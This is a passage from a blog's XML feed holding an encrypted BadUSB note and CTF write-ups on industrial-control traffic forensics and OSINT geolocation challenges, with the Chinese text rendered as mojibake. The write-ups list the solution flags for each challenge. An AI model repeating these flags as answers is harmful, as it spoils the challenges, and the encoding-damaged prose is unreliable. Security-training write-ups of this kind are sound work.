0b878dacdea5d048d6fd1658fd387a47c4cc7e91b3335c9cbf4c3f5b4aa804398fa8cae40139b69632f7de815d4e7482c43134e06e6fdc0abad49ec5c79a9a9353fb90aa1faa48819ad7032d2fa38f83375c3bf5de839436c0637f5a82ef5439842e8bbd2f93e4af862d92e8d00161ce55c0affcb8ec3eb79d2afe15ca39fdc0c3da681627493aadfb31c1439e6f103615ddd723db2fc35319d625050ce2fb06149ee870d41fc81087910f8bf999c592c25bf2159eaed8fb57fc2a183cb39c10b49ceefbb1cd949c76c25f33dc549b2ce1f8eed2e5528d840f4e41f01a3565c8dccbd662bcf39468ed9cb069aaa7099b0d6d6f91cf7541eb84414172c836c04d187d3cd52617b784442b88e22dbd954eb51cf8f1f4b0a1429078106f591ed942259a34949a668901b068548e4e5bde523a74c00d0a6fafb8f32f62463cd139385eb3b0525e54c4fa8ebe1cc5b5e7355b083ab26d6bda222fbd968b3b319b2632761748a85385df4f1bc98eeeccaa6a27e59e3237c6ff9fffa8b939473d6944c2345c89014b766c53f1facafa503de5c3ca8e1807c13f5325fe47e22debe4ca6800d0bacb6bb544c7271ab607d8ee48b59c3130c31963290cd173a14fd3edd4102fcae097180feea34c282a00ee2050c994f94826c70adb9350eaad9243f1d43a30ad6adf5dee8470857015ee2f8cc4e5f8667e9e721df9452612448adce98dfb90b768b22f91face42913e23d9ca2fd386a01467e65d57d524587f84912976038d969fe50dc78ce6390555d4641b0a8c14392dc2e70a30356f491a3172722067a16a4859d9975d842f192b5d16f45f06bf2d585da9d7ebe1645f53a306c54b431c7d836b869bdacff5784dfdd1e85fb7ef7bf6d456027b655a93f758101c5d19586464f52f1a005883fbfd6513bb9fbe7930dd7086a48e6668d9c00e172575f4fc1c4af7503557b2ea3026ad34046696dfede641dccdcd1f3dd2f0d15ec01b468d4c65fe4e5f42f3cc2aec72129737dd089811fbcb10c7346dbdd4b118847c90a1acd52d823400e638cb036789b97d4774ec251ceb62212545bb6dfd4dfb1288fcae6bdb30f1a05907f30d6eaadf7ff98aed78891f9fa28b52843204c73a59ecdb4f761c73f2858639ee5a8edc1a85b29b0e755037a0639657154c657100cd678c6843f19c96c561905de5b626a5a84eef767d096ea120c5c40c751d6b9621f465201818284b3eb3afce4beb0d7f7d5eed4b29ded14e4c24c8d8036450c62392741a5c7499005272c1475bc2a93a8deea934c9b050a6c7f838eacc2d6568f370f4ecdc39a557ff1e98b1db021ce4696cb46373c8686f6031288a4a52eddea34c0a519ef04705104b3fc06cc7f1a50baad84b2015b15540ca5fad3c81a43564ed2a44eb28cabbafa17dab1494208debd217e9d11abe5d83ce83f25d2bbc3710c6fbb5c467e181dd541a02859e6b9697dafa71a6f4782b7351d9556701317a38c7e5cea3e2d522e116aee9aa5fd91fd533f940caa338d83420d5d6ac376f9f6a0fbd004f56edd7952d4c0b16795accdaebf866bb09ec3593ccbe208d05186fa1f5844d924fe8d23ba0d5feb9af8a5bd6d9aea219147daf7bb00b3d765fa0ad9b8e1bf9006396317604426c869b43180da087d2a514e1bb54b4d9408e077fff35a3add4aca4d10501e2f96095182733587eedddfe11418db9cae499e0d62967d488cd8b6e28dedabe6ff1daad7f8400c3dde2140d1f7709f49a19b21abc361501c3d21764ef0b6ac15f5658644915a66fd04d8f0c25e443030743a819e989f7266a291c51bfd1a4250bc33ea5fc1302c491558e114bc25e1fccaaca5744cb9e892f80224f1bdfde192ee60d2667389a2a9f5ce3775999277357f561ce7c83080e2456a3fdd30f19865e0801403083b95e44d14367151139d4c84d8d972275898d685d0d3dd47bb780d530977065d43f52d30519f31776e4d9d9e56c2604ac55536f7a7c9475d155970b866f7230a0623533a2a6280d6b5346bdb9b8af85b0771e59ac15d8771dd1e92f08000fb1065cb193676c88721757869db7504cb411c57cb98a2fbf81461cc4cb107d580a54504f6488fea88b36305fe97e9ff94adaa2f0596a9d8ad1d1d3df958d0136aea29e6437783daff6ace3fee80bbecc9ba83f740d64614991ac2b77bee68cdc322aa6556f94f5f2ec021568bf223ac0f81f3ca736484d70c614d5c64d29b9d02d8f576ca629e87916f2e0b8877c2f2ed0e12d64e8696a07ccb9756db24798f3dfcd728373e442388de207f7087aa69e6a8ae6058b01a7d0d0858ba4be3af4d0031f673badfc613b3d6051b32082d101d1ede3274e0d3a47bb57c79eb08d6b181a62b956cdc45918291943ae10582546ca87278effc4c692bda69ea07169d556bb397dafbc14cafdbab6ee20a9b6e6b3f115a6ee8e8742d346888e7ea684690a3d34ffe48eb3a4b2c244441a76439f9e16a8176ac56ec0de6303d5ed5a61b0007c2575d6b282e0b2851e51b4e5a782dab567f5efd282bcaefd9ba3faa45817b8e39272ae9c81d0ebd5d5ef90228bc8c4115ea00412ee5ce5b8914ac86cf545e7293bddb3de5315d0927451505db3f133d2b3d210282cda58f09eaa575d75b63950aad09b3f8d9b3591e66b3c6c42bfadcd9b9052cc6f011da996655474e4732525c8cde34b0f55ab355bb8d51e78f9c3284985b57377d41e08070c1060de7dd5ca6cd04587837864d2bbe4e7de51af6f71d4f1c36dcddabc9d26c6c5c8c1d898a4500188b3c709fbd294a1744feea75258b1466f8c255aab619ce24eca48982e3ef76391d860b17981c534d963e40924d99bb0d2e8feadad6a42cb49cc96bfa459a9f7dbd7bf1b10151f2356e555d416db3afd9458c07d7ce475720f906d66a6e3ef133d5ad623a463bc936db6ec009b2a4b87678937763718a6893e401c153b7cec10dad714402b97c3cdf39bd065342dc39fc824e63906a73e128e56eb30b1bf003539a74507b32fed950790103732ff6ae02d6883454b1508dc6c9530e377d1b9b642c70535e6c06498195a6409ed378e8772a2762d0890bcc67d25cf97c4fa26a19626f0175a70ee47b6f9669bb5d8e2f7c41249ff00b3f53d35eef055722fe159cb3be551d300105b9a1ed17621c4192e5c2db03fa7b0931fc09f12fe5aa1add2e9fb36512431f36587dfe5287de6a08ce4bfec8139bd3615b426a0401e46386cf5f8d1e8b3104747cf4055f6de6823e11bdca9002d0d9d7b573cf1ccb8618543e8ee6b5aebd50fb59b6eca53616f761a22744211c2e940e9864cb13fe694b1001ef8242d41cd014e44a21445da2d11fd0793ddcfee0ca94765effcd63a08a7e5a327ad9945a728532b16d69bb0519ff0dfff99089fb22da189e81aea8cda4c1d94b2c872413dec6bea2ac063b50f120184d51a6bb342f84beaa26d5d8f0daa4585fb6c38f1f69fbc0b7289fdec9dfd9eead54ad2a5f9f07b675410e41805c22e6091768810f99cbaf4d9be33e3aa104ec9d36aa528eeeef8b11142cb0c701afb8cc240daa6d36e00ae62ea37afc57ee90946d4cfa8496a75ce1b171e973894d34ff351518607108a9a11fbae002de3fe341d8540cf421f469ba9ffb57f069f74989b42f4c3e4d45cee3b128ab770e22765673aafa38ef8b172ea1447bdac4afee8eee497539c0b075001104cc516637ddf8a0b8eac080dacce2953280ee5da5a05943f921a64a91a95878e5c63ba7f1d0b884143f5735f2874e97fdea53d92e221426333b2ae7dc66149fa8a001e7d673c35c10fbab4f4c2a13463962997e55ad801707b0c1db9e016998061e13b31591a15f82909334be656d9cb7182ffc42c715b717e34dfeff373623f917db2aaa0d964c6e654879c87d8740684cdba01b0f3bada29d16d42b8e53d9c611c10e29df5eb44dac4cd31e4900f4b82a896728995a317e39175ff9a0a189cf657eadabb0a52e08349e0db78515a1b32983b1f53697a0fc58786ae2fad0b57d0392ded26a42c4d3766f9b871e447536a551b7818b4f99fdcda0fadfb4fc58730494581f15987c30e5aa08773d10143d899b3b40b2779c524ce0f805acf2da0158fcec72152f7ac9350d4f67abdea70eb6c3b7baf12d8e8547143ace0faf01555b95d9d04ea563f83089bdea8050bab07209ffd6be25854bb00d0c1e20c2fa23a4512dc0e5708024b53b68adef424b03a2c5b639205d0cb614714355132f1d690d2ffd2b91558c7ed9c8ece82cbaaca6774d5afb7c7896caa6100ebed194b5af52a9585b2a515c22b473103d96cef3dc34892b9cfa90d48b9bb14c0f654aa184558e7f099f06dab75c2e66134850cbeca210a4a42d6d7df932f1421f11d692549c51a9691ee8cd9404a000188e3b703c24011b4f45c807040a0ab1673d083656976b5cbcc2ba93ebbdc1af2f625d34918ded796183cb73d7b5e80a1a6814c14a03a77f4ce123262b790088098fcefb759516fb6bcd45b325d35d205cd7a67fdd76c41d10e760a0ad5ba4fa7cbc17f7228dc540bdc5f66b8914c8dfaf837d9fa94e3e7ebdd50fe92d703218e4a078588470e1f524ce30fc5f67a6c9f187af8a99f93898cc20d1660f60a0b3e5182c96059bf20adead42d82ae77eb8244c53cf2a821c0baf879f7a547dfd239c66cfc7dbde7fa403b12f580591a80d4964fb7755f614c0d4b950f33d7bfc13bdbb7a98d235b34470204d71e8f89298591a628650018dfafc1ea8c37c8049dbc92b7342569a8fa18c1155f81ea140fe7b9c4a7e7ea846e4b482c1903ff1fe39904b9286cd38a3d9f1edf5bd1aeca291d63535230d100de29469ba499979219d7ea00055128fc83879cb993db136abd052067db6ddd5046f2bc237aab40f3253f03d3385a6f2ab45b42313803da4cb4b7dda403e154fda6581e6f2052dc091bbfb0f05d5cfdad15da5ef13ed0b8fcab5359e35450fc42fb57e96d9454cd475daa6829899675f049e13338519aa43192d748de86122819dc3e5652f8400e528c58f43ce1e8f32965270b51c6405c0e62ba5a7ab561f9cd8b21436d4cececa2de8ba5ac3f63a90ebda11532d2e28520577d103ebc85e9544204c4c2d550742e5574a58a3c91f05ed8081f5e6f6e1821ab0e051f213811f220804f4ac3171e603870ac377d381acf37dbd5e05b642ef04c2694a24b818ca03266fe6de9f1166e593ec1b42d38a2e50fba799d5847dccbacdd2a99c673c6b254de8a8a2e3c31273b5e94d9f83bbb6238bf8c7594fd44abea02fe2c15026174f2c87e8e2a0faf29eae62ed96d2fe8b336e5d52df73bb30e729a4af294d4faa35b3e6665fb71ac762db9fa14d7270786f8e70963cfa6e5e6e3d18e2b229fd26dff50e78aa78980ce92e40a6644fdd1ab320b57bf7f083b74d28b8ed794ffb3ce222fe1ba3a7ec03621999656472f5c2a2058846af2006d4eff7cf1bd2b4b24e1b8ae495eb7f6e67e7db1660414b5690300147030380eb94570e319c4a4d24bcbb7a133dee0fe04281bd561d022acc2366984674d8487c6a67fda97a1db4b51afc60378a3afd94fb8df3618104ea45bb264e70481b96a5876f8494864407e276cfb1e526fdb494530f6ec23ab1194392b1952d0c088f6418ef0350dc943a68a2b9324f16094b4c4041b22dc97fa660b82b08ab12cc712c8a931187ef9361b6ea34df5d230aa89b7cae2794cfb23d28a48bed1ef8d367da82710e956261b8669f84137b4d7e2de1be6e3aee95314b1a1f749e191da071f6fe57be9c9305562cebfd00fb7fd7dda1fae4907c9d391b74dfb022be1aaa1e769ef28daaf0fadc6b2b4005077bf5d81607b9af70d8b4d65d445422b71afa0ec5dc3b785b3221b353fed27760ab7bc83b464fd9f38032d99c8ba276709245ab403b316a53cb430a355ffa221912fb18ff26c328444c6851b2594bbc521146b4c52174e1807ee7dc0005dd6ecaa0cf48f6adb08287ca7544465590c569663248afd95a2ca77d77c8b408722f212e3cf946e069dab1048a2d11a9d23291d97bc857ccf2fed9568de82866fff4d5057ed5864e50916018f15a028c9137c4d245bcf30fedfcc0976de07720add38ca5578e988203a7b5f14937f85f145960915453f5e637afe5b199db364669a93371b51500642bec3e8dbb1e974178b8e1da41c7d086c105d4fc806ede69b1ec88ae149953cf2f4b2748b20ec9e11922cdf363e1fe2122d6d4f49ed5f92be610c05125ecc0c5b2e4c0620a3211395b8627d45be72e9b78ef31eacddf9bea397da3bf5d49d7620d3d196c6b846bd511430ea3dd7bce4e7451f0a6f42c6982bf3007edf69334939eb5956520b97ebd1776910dd4b5f58e687f000425b162ce2a71da320</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥æ§CTF-çºµæ¨ªç½‘ç»œé¶åœºç¤¾åŒº</title>
      <link href="2021/10/07/gongkongxilie/"/>
      <url>2021/10/07/gongkongxilie/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰æ®µæ—¶é—´çœå·¥æ§è¢«æš´æ‰“äº†å°±æƒ³ç€å­¦ä¹ ä¸€ä¸‹å·¥æ§çŸ¥è¯†ï¼Œäºæ˜¯å‘ç°äº†ä¸€ä¸ªå¾ˆniceçš„çº¯å·¥æ§é¶åœºï¼š<a href="https://game.fengtaisec.com/#/dashboard"><strong>çºµæ¨ªç½‘ç»œé¶åœºç¤¾åŒº</strong></a><br>å·¥æ§å°ç™½åœ¨è¿™è®°å½•ä¸€ä¸‹ï¼ˆå’•äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œé¢„è®¡åç»­è¿˜ç°å’•å’•å’•</p><h2 id="è§£é¢˜è®°å½•"><a href="#è§£é¢˜è®°å½•" class="headerlink" title="è§£é¢˜è®°å½•"></a>è§£é¢˜è®°å½•</h2><h3 id="Modbusåè®®"><a href="#Modbusåè®®" class="headerlink" title="Modbusåè®®"></a>Modbusåè®®</h3><blockquote><p>é»‘å®¢é€šè¿‡å¤–ç½‘è¿›å…¥ä¸€å®¶å·¥å‚çš„æ§åˆ¶ç½‘ç»œï¼Œä¹‹åå¯¹å·¥æ§ç½‘ç»œä¸­çš„æ“ä½œå‘˜ç«™ç³»ç»Ÿè¿›è¡Œäº†æ”»å‡»ï¼Œæœ€ç»ˆé€šè¿‡å·¥æ§åè®®ç ´åäº†æ­£å¸¸çš„ä¸šåŠ¡ã€‚æˆ‘ä»¬å¾—åˆ°äº†æ“ä½œå‘˜ç«™åœ¨æ”»å‡»å‰åçš„ç½‘ç»œæµé‡æ•°æ®åŒ…ï¼Œæˆ‘ä»¬éœ€è¦åˆ†ææµé‡ä¸­çš„è››ä¸é©¬è¿¹ï¼Œæ‰¾åˆ°FLAG,flagå½¢å¼ä¸º flag{}</p></blockquote><p>è€ƒå¯Ÿmodbusåè®®ï¼Œè¿‡æ»¤åå‘ç°æœ‰ä¸ªé•¿åº¦æœ€çªå‡ºçš„åŒ…ï¼Œè¿›è€Œå‘ç°ä¸€ä¸²å¯ç–‘å­—ç¬¦ä¸²å¾—åˆ°flagï¼šflag{TheModbusProtocolIsFunny!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong1.png"></p><h3 id="MMSåè®®åˆ†æ"><a href="#MMSåè®®åˆ†æ" class="headerlink" title="MMSåè®®åˆ†æ"></a>MMSåè®®åˆ†æ</h3><blockquote><p>å·¥ä¸šç½‘ç»œä¸­å­˜åœ¨çš„å¼‚å¸¸ï¼Œå°è¯•é€šè¿‡åˆ†æPACPæµé‡åŒ…ï¼Œåˆ†æå‡ºæµé‡æ•°æ®ä¸­çš„å¼‚å¸¸ç‚¹ï¼Œå¹¶æ‹¿åˆ°FLAGï¼Œflagå½¢å¼ä¸º flag{}ã€‚</p></blockquote><p>åœ¨MMSåŒ…ä¸‹æŸ¥æ‰¾ä¸€ç•ªå¹¶æ²¡å‘ç°ä»€ä¹ˆå¯ç–‘çš„ä¿¡æ¯ï¼Œç„¶åè¿½è¸ªtcpæµå‘ç°ä¸€å¼ base64ç¼–ç çš„å›¾ç‰‡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong2.png"></p><p>base64è½¬å›¾ç‰‡åå³å¯å¾—åˆ°flagï¼šflag{ICS-mms104}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong3.png"></p><h3 id="å¤§å·¥UDPåè®®"><a href="#å¤§å·¥UDPåè®®" class="headerlink" title="å¤§å·¥UDPåè®®"></a>å¤§å·¥UDPåè®®</h3><blockquote><p>åœ¨è¿›è¡Œå·¥ä¸šä¼ä¸šæ£€æŸ¥è¯„ä¼°å·¥ä½œä¸­ï¼Œå‘ç°äº†ç–‘ä¼¼æ„ŸæŸ“æ¶æ„è½¯ä»¶çš„ä¸Šä½æœºã€‚ç°å·²æå–å‡ºä¸Šä½æœºé€šä¿¡æµé‡ï¼Œå°è¯•åˆ†æå‡ºå¼‚å¸¸ç‚¹ï¼Œè·å–FLAGï¼Œflagå½¢å¼ä¸º flag{}ã€‚</p></blockquote><p>è¿½è¸ªUDPæµå‘ç°å¯ç–‘å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong4.png"></p><p>hexè§£ç å¾—åˆ°flagï¼šflag{7FoM2StkhePz}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong5.png"></p><h3 id="å·¥æ§èœœç½æ—¥å¿—åˆ†æ"><a href="#å·¥æ§èœœç½æ—¥å¿—åˆ†æ" class="headerlink" title="å·¥æ§èœœç½æ—¥å¿—åˆ†æ"></a>å·¥æ§èœœç½æ—¥å¿—åˆ†æ</h3><blockquote><p>å·¥æ§å®‰å…¨åˆ†æäººå‘˜åœ¨äº’è”ç½‘ä¸Šéƒ¨ç½²äº†å·¥æ§ä»¿çœŸèœœç½ï¼Œé€šè¿‡èœœç½å¯æŠ“å–å¹¶åˆ†æäº’è”ç½‘ä¸Šé’ˆå¯¹å·¥ä¸šèµ„äº§çš„æ‰«æè¡Œä¸ºï¼Œå°†å­˜åœ¨é«˜å±æ‰«æè¡Œä¸ºçš„IPåŠ å…¥é˜²ç«å¢™é»‘åå•å¯æœ‰æ•ˆå‡å°‘å·¥ä¸šä¼ä¸šå¯¹äºäº’è”ç½‘çš„æ”»å‡»é¢ã€‚åˆ†æå‡ºæ—¥å¿—ä¸­é’ˆå¯¹è¥¿é—¨å­ç§æœ‰é€šä¿¡åè®®æ‰«ææœ€å¤šçš„IPï¼Œåˆ†æè¯¥æ‰«æç»„ç»‡,Flagä¸ºè¯¥IPçš„åŸŸå,ï¼Œflagå½¢å¼ä¸º flag{}ã€‚</p></blockquote><p>è™½ç„¶ä¸çŸ¥é“æ€ä¹ˆæ‰èƒ½æ‰¾åˆ°é’ˆå¯¹è¥¿é—¨å­ç§æœ‰é€šä¿¡åè®®æ‰«ææœ€å¤šçš„IPï¼Œä½†æ˜¯ä¸éš¾çœ‹å‡ºæ¥å‡ºç°æœ€å¤šçš„IPå°±æ˜¯139.162.99.243ï¼Œäºæ˜¯å°è¯•å°†å…¶åæŸ¥åŸŸåæäº¤ç«Ÿç„¶çœŸçš„æ˜¯æ­£ç¡®çš„flagï¼šflag{scan-42.security.ipip.net}</p><p>ï¼ˆè¹²ä¸ªå·¥æ§å¤§ä½¬ğŸ‘´æ•™æ•™è¿™é¢˜æ­£è§£æ˜¯å’‹æçš„å‘€~</p><h3 id="éšä¿¡é“æ•°æ®å®‰å…¨åˆ†æ"><a href="#éšä¿¡é“æ•°æ®å®‰å…¨åˆ†æ" class="headerlink" title="éšä¿¡é“æ•°æ®å®‰å…¨åˆ†æ"></a>éšä¿¡é“æ•°æ®å®‰å…¨åˆ†æ</h3><blockquote><p>å®‰å…¨åˆ†æäººå‘˜æˆªè·é—´è°å‘çš„ç§˜å¯†é‚®ä»¶ï¼Œè¯¥é‚®ä»¶åªæœ‰ä¸€ä¸ªMP3æ–‡ä»¶ï¼Œå®‰å…¨äººå‘˜æ€€ç–‘é—´è°é€šè¿‡æŸç§privateçš„æ–¹å¼å°†ä¿¡æ¯ä¼ é€’å‡ºå»ï¼Œå°è¯•åˆ†æè¯¥æ–‡ä»¶ï¼Œè·å–è—åœ¨æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Ÿflagå½¢å¼ä¸º flag{}ã€‚</p></blockquote><p>ï¼ˆéœ‡æƒŠï¼å·¥æ§ç«Ÿç„¶è¿˜æœ‰éŸ³é¢‘é¢˜.jpg</p><p>å°è¯•äº†ä¸€ç•ªéŸ³é¢‘éšå†™æ— æœï¼Œæœ€åè¿˜æ˜¯010çœ‹çœ‹å®ƒçš„æ–‡ä»¶ç»“æ„ï¼Œæ ¹æ®é¢˜ç›®å…³é”®è¯ <code>æŸç§privateçš„æ–¹å¼</code> æˆ‘ä»¬æ‰¾åˆ° <code>struct MPEG_FRAME mf[] - struct MPEG_HEADER mpeg_hdr - uint32 private_bit</code> ï¼Œå°†å…¶æ¯å…«ä¸ªä¸ºä¸€ç»„ï¼Œè½¬åè¿›åˆ¶å†è½¬ASCIIç ï¼Œå¾—åˆ°flagï¼šflag{pr1v4t3_bi7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong6.png"></p><h3 id="å·¥æ§å®‰å…¨å–è¯"><a href="#å·¥æ§å®‰å…¨å–è¯" class="headerlink" title="å·¥æ§å®‰å…¨å–è¯"></a>å·¥æ§å®‰å…¨å–è¯</h3><blockquote><p>æœ‰é»‘å®¢å…¥ä¾µå·¥æ§è®¾å¤‡ååœ¨å†…ç½‘å‘èµ·äº†å¤§é‡æ‰«æï¼Œè€Œä¸”æ‰«ææ¬¡æ•°ä¸æ­¢ä¸€æ¬¡ã€‚ è¯·åˆ†ææ—¥å¿—ï¼ŒæŒ‡å‡ºå¯¹æ–¹ç¬¬4æ¬¡å‘èµ·æ‰«ææ—¶çš„æ•°æ®åŒ…çš„ç¼–å·ï¼Œflagå½¢å¼ä¸º flag{} </p></blockquote><p>010æŸ¥çœ‹å¯å‘ç°å®ƒæ˜¯ä¸ªpcapæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥ç”¨wiresharkæ‰“å¼€ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ä¸»è¦å°±æ˜¯ <code>192.168.0.9</code> åœ¨æ”»å‡» <code>192.168.0.99</code> ï¼Œç„¶åæ ¹æ®é¢˜ç›®æˆ‘ä»¬å°±å…ˆå°†å…¶æŒ‰æ—¶é—´æ˜¾ç¤ºæ ¼å¼æ¥è§‚å¯Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong7.png"></p><p>ä½†ç”±äºå®ƒè¿™æ—¶é—´éƒ½æ˜¯å¾ˆæ¥è¿‘çš„ï¼Œäºæ˜¯æˆ‘ä»¬å†æ ¹æ®åè®®æ¥æ’å‘ç°ICMPåè®®æ­£å¥½æ˜¯å››æ¬¡ï¼Œè¿›è€Œå¾—åˆ°æ•°æ®åŒ…çš„ç¼–å·ä¸º155990ï¼ˆbutæœ€åçš„flagå´æ˜¯flag{155989}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong8.png"></p><p>å±å®ä¹Ÿæ²¡æ•´å¤ªæ‡‚ï¼Œ<a href="https://blog.csdn.net/mochu7777777/article/details/120300941"><strong>é‚£å°±é™„ä¸Šå…¶ä»–å¸ˆå‚…çš„wp</strong></a></p><h3 id="éšè—çš„é»‘å®¢"><a href="#éšè—çš„é»‘å®¢" class="headerlink" title="éšè—çš„é»‘å®¢"></a>éšè—çš„é»‘å®¢</h3><blockquote><p>æ ¹æ®æƒ…æŠ¥å¾—çŸ¥å·¥æ§ç°åœºå‘ç°æŸSCADAç³»ç»Ÿè¢«é»‘å®¢æ”»ç ´,é™„ä»¶ä¸ºé»‘å®¢åœ¨ç›®å½•ç•™ä¸‹çš„æ–‡ä»¶å’Œå½“æ—¶æ—¶é—´æ®µæ•è·åˆ°çš„ä¸€éƒ¨åˆ†æµé‡åŒ…,ä½ èƒ½æ ¹æ®è¿™äº›ä¿¡æ¯åˆ†æå‡ºè››ä¸é©¬è¿¹æ¥ä¹ˆflagå½¢å¼ä¸º flag{}ã€‚</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹å‡ºåœ¨ <code>upload</code> çš„æ–‡ä»¶å¤¹ä¸‹å…¨æ˜¯ <code>webshell</code>ï¼Œç„¶åæˆ‘ä»¬åˆ†ææµé‡åŒ…ä¹Ÿåœ¨httpæµä¸‹å‘ç°<code>webshell.zip</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/gongkong9.png"></p><p>äºæ˜¯æˆ‘ä»¬å°†å…¶æå–å‡ºæ¥â€¦</p><h2 id="ä½›ç³»æ‘¸é±¼ğŸŸing"><a href="#ä½›ç³»æ‘¸é±¼ğŸŸing" class="headerlink" title="ä½›ç³»æ‘¸é±¼ğŸŸing"></a>ä½›ç³»æ‘¸é±¼ğŸŸing</h2>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥æ§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-osint</title>
      <link href="2021/09/27/ctfshow-osint/"/>
      <url>2021/09/27/ctfshow-osint/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–°æ‰‹ä¸Šè·¯"><a href="#æ–°æ‰‹ä¸Šè·¯" class="headerlink" title="æ–°æ‰‹ä¸Šè·¯"></a>æ–°æ‰‹ä¸Šè·¯</h2><blockquote><p>æäº¤å›¾ç‰‡ä¸Šæ¡¥çš„åå­—å³å¯ï¼Œæ ¼å¼ctfshow{æ¡¥çš„åå­—}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-1.jpg"></p></blockquote><p>ç›´æ¥Googleæœå›¾å¾—åˆ°ä¿¡æ¯ï¼šè¯¥åœ°åŒºä½äºèœˆæ”¯æ´²å³¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-001.png"></p><p>æœ€åæœç´¢é™„è¿‘çš„ç»å…¸æ¡¥å³å¯å¾—åˆ°flagï¼šctfshow{æƒ…äººæ¡¥}</p><p><img src="https://github.com/MssnHarvey/image/blob/main/ctfshow-osint-002.png?raw=true"></p><h2 id="åˆå­¦ä¹ç»ƒ"><a href="#åˆå­¦ä¹ç»ƒ" class="headerlink" title="åˆå­¦ä¹ç»ƒ"></a>åˆå­¦ä¹ç»ƒ</h2><blockquote><p>æäº¤è¿™æ¶é£æœºçš„ç›®çš„åœ°ï¼Œæ ¼å¼ä¸ºctfshow{ç›®çš„åœ°}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-2.jpg"></p></blockquote><p>å›¾ä¸­å…³é”®ä¿¡æ¯ï¼šç‘å£«å›½æ——ï¼Œé€šè¿‡æœç´¢å¾—çŸ¥ä¹Ÿå°±5ä¸ªæœºåœºï¼Œä¸€ä¸ªä¸ªè¯•è¿‡å»å³å¯å¾—åˆ°flagï¼šctfshow{è‹é»ä¸–}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-003.png"></p><p>ä¸è¿‡è¿™æ ·è¯•è¿‡å»å°±å¾ˆä¸¢äººï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ç¡®è®¤ä¸‹æ¥ï¼šé€šè¿‡ç™¾åº¦è¯†å›¾æ‰¾åˆ°<a href="https://www.xhaiwai.com/news/15020.htm"><strong>ç›¸å…³æ–‡ç« </strong></a>æœ€ç»ˆç¡®è®¤æ­¤ä¸ºè‹é»ä¸–æœºåœº</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-004.png"></p><h2 id="åˆå­¦åˆç»ƒ"><a href="#åˆå­¦åˆç»ƒ" class="headerlink" title="åˆå­¦åˆç»ƒ"></a>åˆå­¦åˆç»ƒ</h2><blockquote><p>flagæ ¼å¼ä¸º ctfshow{çº¬åº¦(ç²¾ç¡®åˆ°å°æ•°ç‚¹åå››ä½, ä¸ç”¨è¿›ä½),ç»åº¦(ç²¾ç¡®åˆ°å°æ•°ç‚¹åå››ä½, ä¸ç”¨è¿›ä½)} ä¾‹å¦‚ è‹¥æ‰¾åˆ°çš„ç»çº¬åº¦ä¸º( 11.45149,19.19810) åˆ™flagä¸ºctfshow{11.4514,19.1981}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-3.png"></p></blockquote><p>å›¾ä¸­çœ‹åˆ°ä¸€å®¶åä¸ºSandwichNSmoothiesçš„ä¸‰æ–‡æ²»åº—ï¼Œé€šè¿‡è°·æ­Œåœ°å›¾ç²¾å‡†æ‰¾åˆ°è¯¥ä½ç½®å¹¶ç²¾å‡†ç¡®è®¤ç»çº¬åº¦å¾—åˆ°flagï¼šctfshow{55.6382,12.6411}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-005.png"></p><h2 id="åˆå­¦å†ç»ƒ"><a href="#åˆå­¦å†ç»ƒ" class="headerlink" title="åˆå­¦å†ç»ƒ"></a>åˆå­¦å†ç»ƒ</h2><blockquote><p>æäº¤ç…§ç‰‡ä¸Šæ‰€åœ¨å†›äº‹åŸºåœ°çš„åç§° æäº¤ctfshow{å†›äº‹åŸºåœ°è‹±æ–‡}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-4.jpg"></p></blockquote><p>ç›´æ¥è°·æ­Œæœå›¾æŸ¥æ‰¾å¾—åˆ°æ­¤ä¸ºä¿„ç½—æ–¯ Â· Nagurskoyeç©ºå†›åŸºåœ°ï¼Œè¿›è€Œå¾—åˆ°flagï¼šctfshow{Nagurskoye}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/image/ctfshow-osint-006.png"></p><h2 id="ç°æ‹‰ç°åƒ"><a href="#ç°æ‹‰ç°åƒ" class="headerlink" 